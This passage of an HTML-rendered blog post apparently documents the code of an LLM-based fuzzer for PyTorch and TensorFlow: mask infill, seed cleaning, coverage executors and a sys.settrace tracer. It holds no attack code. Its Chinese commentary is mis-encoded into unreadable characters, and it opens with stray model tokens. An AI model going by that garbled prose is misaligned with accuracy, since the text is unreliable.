&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    in_channels = 3, out_channels = 3, kernel_size = 3</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    â€¦â€¦</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>ç”¨&lt;|mask:0|&gt;åˆ°&lt;|endofmask|&gt;ä¹‹é—´çš„éƒ¨åˆ†æ›¿æ¢&lt;|mask:0|&gt;ï¼Œç”¨&lt;|mask:1|&gt;åˆ°&lt;|endofmask|&gt;ä¹‹é—´çš„éƒ¨åˆ†æ›¿æ¢&lt;|mask:1|&gt;ï¼Œç¼ºå°‘&lt;|endofmask|&gt;åˆ™ä¸¢å¼ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">outputs = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(3, 64, kernel_size=4, padding=1)\n</span><br><span class="hljs-string">    \n</span><br><span class="hljs-string">    print(type(conv2d))\n</span><br><span class="hljs-string">    print(conv2d)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    import math\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(3,16, 3, padding=1)\n</span><br><span class="hljs-string">    print(conv2d)\n</span><br><span class="hljs-string">    print(output_np)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(2,4,3,padding = 1, bias = False)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(in_channels = 3, out_channels = 3, kernel_size = 3)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="process-file-py"><a href="#process-file-py" class="headerlink" title="process_file.py"></a>process_file.py</h1><h2 id="get-initial-programs"><a href="#get-initial-programs" class="headerlink" title="get_initial_programs"></a>get_initial_programs</h2><p>ç§å­åº“ç›®å½•..&#x2F;codex_seed_programs&#x2F;codex_${TEST_LIB}_seeds&#x2F;fix</p><ul><li><p>å› ä¸ºæ­¤æ—¶target_apiä¸å¯èƒ½ä¸ºallï¼Œæ‰€ä»¥apisåªæœ‰ä¸€ä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">apis = [os.path.join(directory, target_api)]<br></code></pre></td></tr></table></figure></li><li><p>è¯»å–æ‰€æœ‰ç›®æ ‡apiç§å­æ–‡ä»¶ï¼Œæ¯”å¦‚..&#x2F;codex_seed_programs&#x2F;codex_tf_seeds&#x2F;fix&#x2F;tf.ones&#x2F;*ï¼Œå¤„ç†æ¯ä¸ªç§å­</p><ul><li><p>æ¸…ç†ç§å­æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">original = clean_code(<br>    f.read(), prints_and_imports=<span class="hljs-literal">True</span>, comment=<span class="hljs-literal">True</span>, cuda=<span class="hljs-literal">True</span><br>)<br></code></pre></td></tr></table></figure><p><em>clean_codeè§process_file.py</em></p></li><li><p>åˆå§‹åŒ–SnippetInfill</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">infill = SnippetInfill(<br>    mask_identifier=mask_identifier,<br>    api_call=api_call,<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(api.split(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=library,<br>    replace_type=replace_type,<br>)<br></code></pre></td></tr></table></figure><p><em>SnippetInfillè§util&#x2F;instrumentor.py</em></p></li></ul></li><li><p>è¾“å‡ºï¼š</p><ul><li>Syntax errorï¼šè¯­æ³•é”™è¯¯seedæ•°é‡</li><li>Multi-API callsï¼š<em>0ï¼Œä¹ï¼Œè¿™ç©æ„æ˜¯å¹²å˜›çš„</em></li><li>No Api callsï¼šæ²¡æœ‰ç›®æ ‡apiçš„seedæ•°é‡</li><li>Successfulï¼šæ›¿æ¢æˆåŠŸçš„seedæ•°é‡</li></ul></li><li><p>è¿”å›ï¼šret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ret[api.split(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">1</span>]].append(<br>    &#123;<span class="hljs-string">&quot;original&quot;</span>: original_code, <span class="hljs-string">&quot;infill&quot;</span>: infill_code&#125;<br>)<br></code></pre></td></tr></table></figure></li></ul><p><em>btwï¼ŒSnippetInfillæ›¿æ¢å®Œçš„infill_codeæ²¡ç”¨ï¼šï¼‰</em></p><h2 id="clean-code"><a href="#clean-code" class="headerlink" title="clean_code"></a>clean_code</h2><p>ä¸»è¦åŒ…æ‹¬ï¼š</p><ul><li><p>æ¸…é™¤å‡½æ•°å®šä¹‰</p></li><li><p>æ¸…é™¤tagsï¼Œç”±äºseedæ˜¯codexç”Ÿæˆçš„ï¼Œå¯èƒ½ä¼šæœ‰å¦‚ä¸‹å½¢å¼çš„tag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tag_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;.+&gt;&quot;</span>)  <span class="hljs-comment"># such as &lt;cell&gt;, &lt;test&gt;, &lt;/cell&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>å»æ‰ä¸€äº›api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bad_codes = [<br>    <span class="hljs-string">&quot;tf.test.main()&quot;</span>,<br>    <span class="hljs-string">&quot;tf.compat.v1.test.main()&quot;</span>,<br>    <span class="hljs-string">&quot;disable_eager_execution()&quot;</span>,<br>    <span class="hljs-string">&quot;disable_v2_behavior&quot;</span>,<br>    <span class="hljs-string">&quot;InteractiveSession&quot;</span>,<br>    <span class="hljs-string">&quot;exit()&quot;</span>,<br>]<br></code></pre></td></tr></table></figure></li><li><p>å»é™¤ç§å­è®¾ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> re.sub(<span class="hljs-string">&quot;torch\.manual_seed\(\S+\)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, code)<br></code></pre></td></tr></table></figure></li><li><p>å»é™¤ç©ºè¡Œ</p></li><li><p>å»é™¤ä¸»å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">code = original.replace(<span class="hljs-string">&#x27;if __name__ == &quot;__main__&quot;:&#x27;</span>, <span class="hljs-string">&quot;if True:&quot;</span>)<br>code = code.replace(<span class="hljs-string">&quot;if __name__ == &#x27;__main__&#x27;:&quot;</span>, <span class="hljs-string">&quot;if True:&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>å»é™¤printã€importå’Œfrom</p></li><li><p>å»é™¤cudaè®¾ç½®</p></li><li><p>å»é™¤session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">session_pattern1 = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;with tf.compat.v1.Session()&quot;</span>)<br>session_pattern2 = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;with tf.Session()&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_session</span>(<span class="hljs-params">original</span>):<br>    code = re.split(session_pattern1, original)[<span class="hljs-number">0</span>]<br>    code = re.split(session_pattern2, code)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure></li></ul><p>ä»¥ä¸Šæ¸…ç†æ˜¯ä½¿ç”¨æ¨¡å¼åŒ¹é…å®Œæˆçš„</p><p>ä»¥ä¸‹æ¸…ç†æ˜¯ä½¿ç”¨astå®Œæˆçš„ï¼š</p><ul><li><p>æ¸…ç†comments</p><ul><li><p>å…ˆå»é™¤#å¼€å¤´çš„è¡Œ</p></li><li><p>PassRemoveDocstringç±»å»é™¤docstring</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    root = ast.parse(code)<br>    PassRemoveDocstring().remove_docstring(root)<br>    modified = ast.fix_missing_locations(root)<br>    code_cleaned = astunparse.unparse(root)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure><p><em>PassRemoveDocstringè§util&#x2F;astpasses.py</em></p></li></ul></li><li><p>è¯­æ³•ä¿®å¤ï¼Œå°±æ˜¯é€šè¿‡ä¸æ–­å»é™¤æœ€åä¸€è¡Œå†parseã€unparseã€parseç›´åˆ°æ²¡æœ‰è¯­æ³•é”™è¯¯</p></li><li><p>å»é™¤nameçš„keywordï¼Œå½¢å¦‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">test(name=<span class="hljs-string">&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><p>é€šè¿‡SearchAllCallè·å–æ‰€æœ‰callç»“ç‚¹</p></li><li><p>å»é™¤nameçš„keyword</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(<br>    node<br>):  <span class="hljs-comment"># all calls should have keyword arguments already</span><br>    node.keywords = [a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> node.keywords <span class="hljs-keyword">if</span> a.arg != <span class="hljs-string">&quot;name&quot;</span>]<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="mycoverage"><a href="#mycoverage" class="headerlink" title="mycoverage"></a>mycoverage</h1><h2 id="mp-executor-py"><a href="#mp-executor-py" class="headerlink" title="mp_executor.py"></a>mp_executor.py</h2><p>å…¨å±€ä¸¤ä¸ªexecutorï¼Œä¸€ä¸ªæ¨¡å¼flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">RUN_CPU_MODE = <span class="hljs-literal">True</span><br>test_executor = <span class="hljs-literal">None</span><br>cov_executor = <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><h3 id="init-test-executor"><a href="#init-test-executor" class="headerlink" title="init_test_executor"></a>init_test_executor</h3><ul><li><p>ä¼ é€’å‚æ•°close_fd_maskå’Œdebug</p></li><li><p>torchï¼š</p><ul><li><p>éœ€è¦æ”¶é›†è¦†ç›–ç‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cov_executor = PyTorchCoverageExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li><li><p>åˆå§‹åŒ–test_executor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">test_executor = PyTorchExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>tfï¼š</p><ul><li><p>è®¾ç½®ç¯å¢ƒå˜é‡TF_CPP_MIN_LOG_LEVEL&#x3D;3</p></li><li><p>è®¾ç½®tf.logger</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.get_logger().setLevel(<span class="hljs-string">&quot;ERROR&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>tensorflowè®¾ç½®å†…å­˜åŠ¨æ€å¢é•¿</p></li><li><p>ä¼ é€’å‚æ•°cpu&#x3D;RUN_CPU_MODE</p></li><li><p>éœ€è¦æ”¶é›†è¦†ç›–ç‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cov_executor = TensorFlowCoverageExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li><li><p>åˆå§‹åŒ–test_executor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">test_executor = TensorFlowExecutor(**kwargs)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="exec-func"><a href="#exec-func" class="headerlink" title="exec_func"></a>exec_func</h3><p><em>å•çº¯è¯»å–æ–‡ä»¶+æ‰§è¡Œ</em></p><h3 id="exec-func-tf-cpu"><a href="#exec-func-tf-cpu" class="headerlink" title="exec_func_tf_cpu"></a>exec_func_tf_cpu</h3><p><em>å•çº¯è¯»å–æ–‡ä»¶+è®¾ç½®cpu+æ‰§è¡Œ</em></p><h3 id="cov-worker-tf"><a href="#cov-worker-tf" class="headerlink" title="cov_worker_tf"></a>cov_worker_tf</h3><ul><li><p>å…³é—­è¾“å‡ºçš„æ–¹å¼æ˜¯ç›´æ¥å¯¼åˆ°&#x2F;dev&#x2F;null</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(os.devnull, <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-keyword">if</span> close_fd_mask &amp; <span class="hljs-number">1</span>:<br>    sys.stdout = f<br><span class="hljs-keyword">if</span> close_fd_mask &amp; <span class="hljs-number">2</span>:<br>    sys.stderr = f<br></code></pre></td></tr></table></figure></li><li><p>è®¾ç½®å›è°ƒå‡½æ•°ï¼Œç”¨äºè·å–coverage</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.settrace(tracer.trace_tf)<br></code></pre></td></tr></table></figure><p><em>trace_tfè§mycoverage&#x2F;tracer.py</em></p></li><li><p>æ¥å—serverä¼ é€’çš„æµ‹è¯•æ–‡ä»¶å</p></li><li><p>æ‰§è¡Œæµ‹è¯•æ–‡ä»¶</p></li><li><p>å›ä¼ é”™è¯¯ä¿¡æ¯æˆ–è¦†ç›–ç‡</p></li></ul><h3 id="cov-worker-torch"><a href="#cov-worker-torch" class="headerlink" title="cov_worker_torch"></a>cov_worker_torch</h3><p><em>ç±»ä¼¼tf</em></p><h3 id="worker-tf"><a href="#worker-tf" class="headerlink" title="worker_tf"></a>worker_tf</h3><p><em>å°‘ä¸€ä¸ªè¦†ç›–ç‡ï¼Œå…¶ä»–ä¸€æ ·</em></p><h3 id="worker-torch"><a href="#worker-torch" class="headerlink" title="worker_torch"></a>worker_torch</h3><p><em>å°‘ä¸€ä¸ªè¦†ç›–ç‡ï¼Œå…¶ä»–ä¸€æ ·</em></p><h3 id="class-Executor"><a href="#class-Executor" class="headerlink" title="class Executor"></a>class Executor</h3><p>æ‰€æœ‰çš„executoréƒ½ç›¸å½“äºä¸€ä¸ªserverå’Œä¸€ä¸ªclientï¼Œé€šè¿‡ä¸€å¯¹pipeé€šä¿¡</p><ul><li><p>å‚æ•°ï¼š</p><ul><li>workerï¼šclientï¼Œä½¿ç”¨child_conn</li><li>single_test_timeoutï¼šå•æ¬¡æµ‹è¯•timeoutï¼Œé»˜è®¤10</li><li>close_fd_maskï¼šéœ€è¦å…³é—­çš„pipeï¼ˆstdoutå’Œstderrï¼‰</li><li>exec_funcï¼šæ‰§è¡Œæµ‹è¯•æ–‡ä»¶ä½¿ç”¨çš„æ‰§è¡Œå‘½ä»¤ï¼Œé»˜è®¤ä¸ºexec_func</li><li>debugï¼šæ˜¯å¦å¼€å¯debugæ¨¡å¼</li></ul></li><li><p>__init__ï¼š</p><ul><li><p>å¼€å¯client</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">self._p = ctx.Process(<br>    target=self.worker,<br>    args=(self._exec_func, self.child_conn, self._close_fd_mask),<br>)<br>self._p.start()<br></code></pre></td></tr></table></figure></li><li><p>è®¾ç½®testç¨‹åºçš„æ–‡ä»¶å¤¹è·¯å¾„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self._test_dir = os.path.join(<br>    os.path.dirname(os.path.realpath(__file__)), <span class="hljs-string">&quot;test_programs&quot;</span><br>)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>run_testï¼š</p><ul><li>serverå‘clientå‘é€æµ‹è¯•æ–‡ä»¶å</li><li>è½®è¯¢clientï¼Œç›´åˆ°timeouté‡å¯client</li><li>ç­‰å¾…clientè¾“å‡º</li></ul></li></ul><h3 id="class-CoverageExecutor"><a href="#class-CoverageExecutor" class="headerlink" title="class CoverageExecutor"></a>class CoverageExecutor</h3><p>çˆ¶ç±»Executor</p><ul><li><p>__init__ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, worker, single_test_timeout=<span class="hljs-number">10</span>, **kwargs</span>):<br>    <span class="hljs-built_in">super</span>().__init__(worker, single_test_timeout, **kwargs)<br>    self.prev_coverage = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Init cov executor&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>run_testï¼š</p><ul><li><p>serverå‘clientå‘é€æµ‹è¯•æ–‡ä»¶å</p></li><li><p>è½®è¯¢clientï¼Œç›´åˆ°timeouté‡å¯client</p></li><li><p>ç­‰å¾…clientè¾“å‡ºï¼ŒæŠ¥å‘Šå¹¶æ›´æ–°coverage</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Cov: <span class="hljs-number">502</span> -&gt; <span class="hljs-number">813</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-TensorFlowCoverageExecutor"><a href="#class-TensorFlowCoverageExecutor" class="headerlink" title="class TensorFlowCoverageExecutor"></a>class TensorFlowCoverageExecutor</h3><p>çˆ¶ç±»CoverageExecutor</p><ul><li><p>__init__ï¼š</p><ul><li><p>workerï¼šcov_worker_tf</p></li><li><p>exec_funcï¼š</p><ul><li>cpuæ¨¡å¼ï¼šexec_func_tf_cpu</li><li>écpuæ¨¡å¼ï¼šexec_func</li></ul></li><li><p>è®¾ç½®traceçš„library</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tracer.trace_library = <span class="hljs-string">&quot;tf&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>clientæ‰§è¡Œmemory_growthï¼Œå¹¶æµ‹è¯•è¿é€šæ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.run_test(os.path.join(self._test_dir, <span class="hljs-string">&quot;set_memory_growth.py&quot;</span>))<br></code></pre></td></tr></table></figure></li><li><p>è®¾ç½®checkç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_tf_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-TensorFlowExecutor"><a href="#class-TensorFlowExecutor" class="headerlink" title="class TensorFlowExecutor"></a>class TensorFlowExecutor</h3><p>çˆ¶ç±»Executor</p><ul><li><p>__init__ï¼š</p><ul><li><p>workerï¼šworker_tf</p></li><li><p>exec_funcï¼š</p><ul><li>cpuæ¨¡å¼ï¼šexec_func_tf_cpu</li><li>écpuæ¨¡å¼ï¼šexec_func</li></ul></li><li><p>clientæ‰§è¡Œmemory_growthï¼Œå¹¶æµ‹è¯•è¿é€šæ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.run_test(os.path.join(self._test_dir, <span class="hljs-string">&quot;set_memory_growth.py&quot;</span>))<br></code></pre></td></tr></table></figure></li><li><p>è®¾ç½®checkç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_tf_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-PyTorchExecutor"><a href="#class-PyTorchExecutor" class="headerlink" title="class PyTorchExecutor"></a>class PyTorchExecutor</h3><p>çˆ¶ç±»Executor</p><ul><li><p>__init__ï¼š</p><ul><li><p>workerï¼šworker_torch</p></li><li><p>è®¾ç½®checkç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_torch_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="class-PyTorchCoverageExecutor"><a href="#class-PyTorchCoverageExecutor" class="headerlink" title="class PyTorchCoverageExecutor"></a>class PyTorchCoverageExecutor</h3><p>çˆ¶ç±»CoverageExecutor</p><ul><li><p>__init__ï¼š</p><ul><li><p>workerï¼šcov_worker_torch</p></li><li><p>è®¾ç½®traceçš„library</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tracer.trace_library = <span class="hljs-string">&quot;torch&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>è®¾ç½®checkç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.check_filename = os.path.join(self._test_dir, <span class="hljs-string">&quot;check_torch_state.py&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="coverage-py"><a href="#coverage-py" class="headerlink" title="coverage.py"></a>coverage.py</h2><p>å…¨å±€</p><ul><li>trace_libraryï¼šè¦è·Ÿè¸ªçš„åº“</li><li>prev_lineï¼šå‰ä¸€è¡Œ</li><li>prev_filenameï¼šå‰ä¸€ä¸ªæ–‡ä»¶</li><li>dataï¼šcoverage</li></ul><p>è®¾ç½®è·Ÿè¸ªå‡½æ•°ï¼Œè·Ÿè¸ªå‡½æ•°ä¸‰ä¸ªå‚æ•°ï¼Œframeï¼Œeventï¼Œarg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.settrace(tracer.trace_tf)<br></code></pre></td></tr></table></figure><ul><li>eventå–å€¼<ul><li>callï¼šå‡½æ•°è¢«è°ƒç”¨æ—¶è§¦å‘</li><li>returnï¼šå‡½æ•°è¿”å›æ—¶è§¦å‘</li><li>exceptionï¼šå‡½æ•°æŠ›å‡ºå¼‚å¸¸æ—¶è§¦å‘</li><li>lineï¼šè¯­å¥æ‰§è¡Œ</li></ul></li><li>frame<ul><li>f_codeï¼šå½“å‰å¸§æ­£åœ¨æ‰§è¡Œçš„ä»£ç </li><li>f_linenoï¼šå½“å‰å¸§æ­£åœ¨æ‰§è¡Œçš„ä»£ç è¡Œå·</li></ul></li></ul><p>è®°å½•æ–‡ä»¶å†…çš„è·³è½¬å’Œæ–‡ä»¶é—´çš„è·³è½¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> func_filename != prev_filename:<br>    data[func_filename + prev_filename].add((prev_line, func_line_no))<br><span class="hljs-keyword">else</span>:<br>    data[func_filename].add((prev_line, func_line_no))<br></code></pre></td></tr></table></figure><h1 id="util"><a href="#util" class="headerlink" title="util"></a>util</h1><h2 id="Seed-pool-py"><a href="#Seed-pool-py" class="headerlink" title="Seed_pool.py"></a>Seed_pool.py</h2><h3 id="class-GA"><a href="#class-GA" class="headerlink" title="class GA"></a>class GA</h3><ul><li><p>__init__ï¼š</p><ul><li><p>åªéœ€è¦æ³¨æ„self.num_generatedåˆå§‹åŒ–ä¸ºbatch_size</p></li><li><p>load api symbols</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.api_call_list, self.full_api_list = load_api_symbols(library)<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚aaa.bbb.ccc()ï¼Œself.api_call_liståŒ…æ‹¬cccï¼Œself.full_api_liståŒ…æ‹¬aaa.bbb.ccc</p></li><li><p>åˆå§‹åŒ–SnippetInfillArbitratyAPI</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self.recursive_infill = SnippetInfillArbitratyAPI(<br>    mask_identifier, self.api_call_list, self.full_api_list, 